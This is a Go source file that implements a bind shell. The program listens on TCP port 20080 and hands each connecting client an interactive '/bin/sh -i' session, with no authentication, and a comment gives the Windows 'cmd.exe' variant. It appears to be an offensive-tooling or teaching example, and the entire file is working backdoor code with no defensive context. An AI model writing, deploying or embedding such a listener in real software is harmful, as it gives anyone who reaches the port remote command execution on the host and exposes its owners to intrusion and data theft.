package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()

	// standard input is everything from the connection
	cmd.Stdin = conn

	// standard output is sends everthing to write to pipe
	cmd.Stdout = wp

	// copy everthing coming in from the connection to the pipe
	go io.Copy(conn, rp)

	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
